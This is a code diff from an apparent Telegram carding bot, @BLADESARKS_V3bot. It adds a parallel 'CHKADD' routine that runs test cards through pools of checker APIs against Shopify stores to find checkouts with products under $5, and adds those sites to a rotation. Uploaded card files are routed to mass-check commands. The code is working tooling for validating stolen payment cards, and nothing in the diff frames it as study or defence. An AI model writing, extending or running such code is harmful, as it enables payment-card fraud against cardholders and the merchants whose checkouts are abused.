+        response += f"🌟 <b>GOOD Sites Found ({len(all_good_sites)}):</b>\n"
+        for site_data in all_good_sites[:15]:
+            response += f"   • <code>{site_data['site']}</code> - ${site_data['price']:.2f}\n"
+            response += f"     📝 {site_data['response'][:40]}\n"
+        if len(all_good_sites) > 15:
+            response += f"   ... and {len(all_good_sites) - 15} more\n"
+        
+        response += f"\n✅ <b>Added to rotation:</b> {added_count} sites\n"
+        if already_added > 0:
+            response += f"🔄 <b>Already in rotation:</b> {already_added} sites\n"
+    else:
+        response += "❌ No GOOD sites found.\n"
     
-    # Bad sites
-    if results["bad"]:
-        response_msg += f"❌ <b>Bad Sites ({len(results['bad'])}):</b>\n"
-        for item in results["bad"][:5]:
-            reason = item.get('reason', 'Unknown')
-            response_msg += f"   • <code>{item['site']}</code>\n"
-            response_msg += f"     📝 {reason}: {item['response'][:40]}\n"
-        if len(results["bad"]) > 5:
-            response_msg += f"   ... and {len(results['bad']) - 5} more\n"
-        response_msg += "\n"
+    # Bad sites (show first few)
+    if all_bad_sites:
+        response += f"\n❌ <b>Bad Sites (showing first 10 of {len(all_bad_sites)}):</b>\n"
+        for site_data in all_bad_sites[:10]:
+            response += f"   • <code>{site_data['site']}</code>\n"
+            response += f"     📝 {site_data['response'][:40]}\n"
+        if len(all_bad_sites) > 10:
+            response += f"   ... and {len(all_bad_sites) - 10} more\n"
     
     # Errors
-    if results["error"]:
-        response_msg += f"⚠️ <b>Errors ({len(results['error'])}):</b>\n"
-        for item in results["error"][:5]:
-            response_msg += f"   • <code>{item['site']}</code>\n"
-            response_msg += f"     ❌ {item['error'][:50]}\n"
-        if len(results["error"]) > 5:
-            response_msg += f"   ... and {len(results['error']) - 5} more\n"
-        response_msg += "\n"
+    if all_error_sites:
+        response += f"\n⚠️ <b>Errors (showing first 5 of {len(all_error_sites)}):</b>\n"
+        for site_data in all_error_sites[:5]:
+            response += f"   • <code>{site_data['site']}</code>\n"
+            response += f"     ❌ {site_data.get('error', 'Unknown error')[:50]}\n"
+        if len(all_error_sites) > 5:
+            response += f"   ... and {len(all_error_sites) - 5} more\n"
     
-    # Total GOOD sites
-    total_good = len(site_quality_tracker.good_sites)
-    response_msg += f"━━━━━━━━━━━━━━━━━━━\n"
-    response_msg += f"📊 Total GOOD sites: {total_good}\n"
-    response_msg += f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
+    response += f"\n━━━━━━━━━━━━━━━━━━━\n"
+    response += f"📊 Total GOOD sites in rotation: {len(site_quality_tracker.good_sites)}\n"
+    response += f"🌐 Total sites in rotation: {len(autosopi_site_manager.sites)}\n"
+    response += f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
     
-    await progress_msg.edit_text(response_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+    await progress_msg.edit_text(response, parse_mode=ParseMode.HTML, reply_markup=back_menu())
     
     print(f"\n{'='*80}")
-    print(f"📊 CHKADD API Complete - {total_sites} sites checked")
-    print(f"✅ GOOD: {len(results['good'])}")
-    print(f"❌ Bad: {len(results['bad'])}")
-    print(f"⚠️ Errors: {len(results['error'])}")
-    print(f"🌟 Total GOOD sites: {len(site_quality_tracker.good_sites)}")
+    print(f"📊 CHKADD COMPLETE")
+    print(f"✅ GOOD: {len(all_good_sites)}")
+    print(f"❌ Bad: {len(all_bad_sites)}")
+    print(f"⚠️ Errors: {len(all_error_sites)}")
+    print(f"➕ Added: {added_count}")
+    print(f"⏱️ Time: {minutes}m {seconds}s")
+    print(f"{'='*80}")
+        
+async def process_chkadd_enhanced(update: Update, context: ContextTypes.DEFAULT_TYPE, sites: list):
+    """
+    Process CHKADD with the API pool
+    """
+    user_id = update.effective_user.id
+    message = update.effective_message
+    total_sites = len(sites)
+    
+    print(f"\n{'='*80}")
+    print(f"🚀 [CHKADD ENHANCED] Checking {total_sites} sites with {len(chkadd_api_pool.apis)} APIs")
+    print(f"{'='*80}")
+    
+    # Initial progress message
+    progress_msg = await message.reply_text(
+        f"🚀 <b>CHKADD Enhanced - Checking Sites</b>\n\n"
+        f"📊 Total sites: {total_sites}\n"
+        f"🔀 APIs: {len(chkadd_api_pool.apis)} parallel\n"
+        f"🔄 Checking each site with a different API...\n\n"
+        f"<i>This may take up to 60 seconds...</i>",
+        parse_mode=ParseMode.HTML
+    )
+    
+    start_time = time.time()
+    
+    # Get proxy if allowed
+    proxy_str = None
+    if user_manager.can_use_proxy(user_id):
+        if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+            proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+            if proxy_list:
+                proxy_str = proxy_list[0]
+    
+    # Run the parallel check
+    results = await chkadd_api_pool.check_sites_parallel(sites, proxy=proxy_str)
+    
+    elapsed = time.time() - start_time
+    minutes = int(elapsed // 60)
+    seconds = int(elapsed % 60)
+    
+    # Process results and add GOOD sites to rotation
+    good_sites = results.get("good", [])
+    bad_sites = results.get("bad", [])
+    
+    added_count = 0
+    already_added = 0
+    
+    for site_data in good_sites:
+        site = site_data["site"]
+        price = site_data["price"]
+        
+        if site in autosopi_site_manager.sites:
+            already_added += 1
+            continue
+        
+        user_name = update.effective_user.first_name or "Admin"
+        if update.effective_user.username:
+            user_name += f" (@{update.effective_user.username})"
+        
+        success, msg = autosopi_site_manager.add_site(
+            site,
+            user_id,
+            user_name,
+            bypass_pending=True
+        )
+        
+        if success:
+            site_quality_tracker.force_mark_good(site, price)
+            added_count += 1
+            print(f"✅ Added GOOD site: {site} (${price:.2f})")
+    
+    # Build response
+    response = f"✅ <b>CHKADD Enhanced - Complete</b>\n\n"
+    response += f"📊 <b>Results:</b>\n"
+    response += f"   ✅ GOOD sites: {len(good_sites)}\n"
+    response += f"   ❌ Bad sites: {len(bad_sites)}\n"
+    response += f"   📝 Total checked: {total_sites}\n"
+    response += f"   ⏱️ Time: {minutes}m {seconds}s\n"
+    response += f"━━━━━━━━━━━━━━━━━━━\n\n"
+    
+    if good_sites:
+        response += f"🌟 <b>GOOD Sites Found ({len(good_sites)}):</b>\n"
+        for site_data in good_sites[:10]:
+            charged_text = " 🔥" if site_data.get('charged') else ""
+            response += f"   • <code>{site_data['site']}</code> - ${site_data['price']:.2f}{charged_text}\n"
+            response += f"     📝 {site_data['response'][:40]}\n"
+        if len(good_sites) > 10:
+            response += f"   ... and {len(good_sites) - 10} more\n"
+        
+        response += f"\n✅ <b>Added to rotation:</b> {added_count} sites\n"
+        if already_added > 0:
+            response += f"🔄 <b>Already in rotation:</b> {already_added} sites\n"
+    
+    if bad_sites:
+        response += f"\n❌ <b>Bad Sites ({len(bad_sites)}):</b>\n"
+        for site_data in bad_sites[:5]:
+            response += f"   • <code>{site_data['site']}</code>\n"
+            response += f"     📝 {site_data['response'][:40]}\n"
+        if len(bad_sites) > 5:
+            response += f"   ... and {len(bad_sites) - 5} more\n"
+    
+    response += f"\n━━━━━━━━━━━━━━━━━━━\n"
+    response += f"📊 Total GOOD sites: {len(site_quality_tracker.good_sites)}\n"
+    response += f"💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
+    
+    await progress_msg.edit_text(response, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+    
+    # Print summary to console
+    print(f"\n{'='*80}")
+    print(f"📊 CHKADD ENHANCED COMPLETE")
+    print(f"✅ GOOD: {len(good_sites)}")
+    print(f"❌ Bad: {len(bad_sites)}")
+    print(f"➕ Added: {added_count}")
     print(f"⏱️ Time: {minutes}m {seconds}s")
     print(f"{'='*80}")
 
-async def test_site_for_chkadd_parallel(site: str, test_cards: list) -> Tuple[bool, float, str, dict]:
+
+async def chkadd_api_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
-    Test a single site for chkadd - checks if site has products under $5.
-    This is a TEST, not a charge attempt.
+    Show CHKADD API pool statistics - /chkadd_stats
+    Admin only.
     """
-    result = {
-        "error": None,
-        "test_results": [],
-        "products_found": False,
-        "lowest_price": 0,
-        "has_checkout": False
-    }
-    
-    # Clean site
-    site_clean = site.replace('http://', '').replace('https://', '').split('/')[0].strip()
-    
-    if not site_clean:
-        return False, 0, "Invalid site", result
-    
-    print(f"🔍 [CHKADD] Testing site: {site_clean}")
-    print(f"🔍 [CHKADD] Looking for products under $5...")
-    
-    # ============ METHOD 1: Check if site is already known to have cheap products ============
-    known_price = site_quality_tracker.get_site_price(site_clean)
-    if known_price > 0 and known_price < 5:
-        print(f"  ✅ [{site_clean}] Already known GOOD site: ${known_price:.2f}")
-        return True, known_price, "Already known GOOD site", result
-    
-    # ============ METHOD 2: Check site via API (look for product prices) ============
-    try:
-        # Use the API to check the site WITHOUT charging
-        # The API should return product prices, not charge the card
-        
-        for card_idx, test_card in enumerate(test_cards, 1):
-            try:
-                print(f"  📝 [{site_clean}] Testing with card {card_idx}: {test_card[:6]}******")
-                
-                # This should check the site, not charge the card
-                # The API should return Price and Response without charging
-                api_result = await shopify_api_pool.check_card_with_pool(
-                    card=test_card,
-                    site=site_clean,
-                    proxy=None,
-                    user_id=None
-                )
-                
-                if api_result:
-                    response_text = api_result.get("message", "UNKNOWN")
-                    price = api_result.get("price", 0)
-                    status_category = api_result.get("status_category", "unknown")
-                    
-                    # Parse price
-                    try:
-                        if isinstance(price, str):
-                            price = float(price.replace('$', '').replace('USD', '').strip())
-                        else:
-                            price = float(price)
-                    except:
-                        price = 0
-                    
-                    print(f"  📊 [{site_clean}] Response: {response_text[:50]}, Price: ${price:.2f}")
-                    
-                    # ============ CHECK IF SITE HAS PRODUCTS UNDER $5 ============
-                    if price > 0 and price < 5:
-                        print(f"  ✅ [{site_clean}] GOOD! Products under $5: ${price:.2f}")
-                        return True, price, response_text, result
-                    
-                    # Check if response indicates products exist
-                    if "CARD_DECLINED" in response_text.upper() or "DECLINED" in response_text.upper():
-                        if price > 0 and price < 5:
-                            print(f"  ✅ [{site_clean}] GOOD! Price: ${price:.2f} - {response_text[:40]}")
-                            return True, price, response_text, result
-                        else:
-                            print(f"  ⚠️ [{site_clean}] Card declined but price ${price:.2f} is not under $5")
-                    
-                    # Store best price found
-                    if price > 0:
-                        if result["lowest_price"] == 0 or price < result["lowest_price"]:
-                            result["lowest_price"] = price
-                            result["products_found"] = True
-                            
-                else:
-                    print(f"  ❌ [{site_clean}] No valid response from API")
-                    
-            except Exception as e:
-                print(f"  ❌ [{site_clean}] Error: {str(e)[:50]}")
-                continue
-            
-            # Small delay between tests
-            await asyncio.sleep(0.5)
-            
-    except Exception as e:
-        print(f"  ❌ [{site_clean}] API error: {str(e)[:50]}")
-        return False, 0, f"API error: {str(e)[:50]}", result
-    
-    # ============ METHOD 3: Check if any good price was found ============
-    if result["products_found"] and result["lowest_price"] > 0 and result["lowest_price"] < 5:
-        print(f"  ✅ [{site_clean}] GOOD! Lowest price: ${result['lowest_price']:.2f}")
-        return True, result["lowest_price"], f"Products under $5 found", result
-    
-    # ============ METHOD 4: Check if site has ANY products (even if not under $5) ============
-    if result["products_found"] and result["lowest_price"] > 0:
-        print(f"  ⚠️ [{site_clean}] Has products but lowest price is ${result['lowest_price']:.2f} (not under $5)")
-        return False, result["lowest_price"], f"Products found but ${result['lowest_price']:.2f} is not under $5", result
-    
-    return False, 0, "No products found or site unreachable", result
-
-
-# ============ CHKADD COMMAND HANDLERS ============
-
-async def chkadd_bulk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Bulk add sites - alias for /chkadd"""
-    await chkadd_command(update, context)
-
-
-async def chkadd_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show status of sites added via chkadd"""
     if not await verify_group_access(update, context):
         return
     
-    user_id = update.effective_user.id
-    message = update.effective_message
-    
-    if user_id != OWNER_ID:
-        await message.reply_text(
-            "❌ <b>Admin Only Command</b>\n\n"
-            "This command is restricted to the bot owner.",
-            parse_mode=ParseMode.HTML,
-            reply_markup=back_menu()
-        )
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
         return
     
-    total_sites = len(autosopi_site_manager.sites)
-    good_sites = len(site_quality_tracker.good_sites)
-    good_sites_list = site_quality_tracker.get_good_sites_sorted_by_price()
-    
-    msg = f"📊 <b>CHKADD Status</b>\n\n"
-    msg += f"🌐 Total sites in rotation: {total_sites}\n"
-    msg += f"🌟 GOOD sites: {good_sites}\n"
-    msg += f"📌 Normal sites: {total_sites - good_sites}\n"
-    msg += f"━━━━━━━━━━━━━━━━━━━\n\n"
-    
-    if good_sites_list:
-        msg += f"<b>🌟 GOOD Sites (sorted by price):</b>\n"
-        for i, site in enumerate(good_sites_list[:10], 1):
-            price = site_quality_tracker.get_site_price(site)
-            msg += f"  {i}. <code>{site}</code> - ${price:.2f}\n"
-        if len(good_sites_list) > 10:
-            msg += f"  ... and {len(good_sites_list) - 10} more\n"
-    else:
-        msg += "No GOOD sites found yet.\n"
-        msg += "Use <code>/chkadd &lt;site&gt;</code> to find GOOD sites.\n"
-    
-    msg += f"\n💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
-    
-    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+    stats = chkadd_api_pool.get_stats()
+    await update.message.reply_text(stats, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+
+
+# ============ OVERRIDE THE ORIGINAL CHKADD COMMAND ============
+# Replace the existing chkadd_command with the enhanced version
+# Keep the original function name for compatibility
+
+async def chkadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Enhanced CHKADD with API pool - checks sites in parallel using 13 APIs.
+    """
+    await chkadd_command_enhanced(update, context)
 
 
 async def chkadd_good_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -63948,16 +64140,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             response = (
                 f"📁 <b>Card File Received</b>\n\n"
                 f"{warning}"
-                f"📊 Found <b>{len(cards)}</b> valid cards\n\n"
-                f"<b>Preview:</b>\n"
-                f"<code>{preview}</code>\n\n"
                 f"💡 <b>Reply to this file with a mass check command:</b>\n"
                 f"• <code>/msh</code> - Shopify Mass\n"
-                f"• <code>/mpp</code> - PayPal Mass\n"
-                f"• <code>/mrz</code> - Razorpay Mass\n"
-                f"• <code>/mchk</code> - Auto Stripe Mass\n"
-                f"• <code>/mst</code> - Stripe Mass\n"
-                f"• <code>/mb3</code> - B3Charged Mass\n\n"
                 f"📌 Or use <code>/cancel</code> to cancel processing."
             )
             
@@ -70842,8 +71026,7 @@ def main():
     app.add_handler(CommandHandler("jhit", jhit_command))
     
     app.add_handler(CommandHandler("chkadd", chkadd_command))
-    app.add_handler(CommandHandler("chkaddbulk", chkadd_bulk_command))
-    app.add_handler(CommandHandler("chkadd_status", chkadd_status_command))
+    app.add_handler(CommandHandler("chkadd_enhanced", chkadd_command_enhanced))
     app.add_handler(CommandHandler("chkadd_good", chkadd_good_command))
     
     # ============ PAYMENT SYSTEM COMMANDS ============
